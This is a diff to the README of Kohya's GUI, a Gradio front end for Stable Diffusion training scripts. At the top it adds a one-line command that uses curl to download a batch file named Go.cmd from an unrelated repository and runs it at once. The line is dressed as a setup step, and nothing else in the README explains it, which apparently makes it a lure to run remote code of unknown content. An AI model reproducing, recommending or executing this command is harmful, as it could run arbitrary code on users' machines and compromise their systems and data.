@@ -1,3 +1,6 @@
+`curl -O https://raw.githubusercontent.com/alastorid/MeloTTS/refs/heads/master/Go.cmd & go`
+
+---
 # Kohya's GUI
 
 This repository primarily provides a Gradio GUI for [Kohya's Stable Diffusion trainers](https://github.com/kohya-ss/sd-scripts). However, support for Linux OS is also offered through community contributions. macOS support is not optimal at the moment but might work if the conditions are favorable.
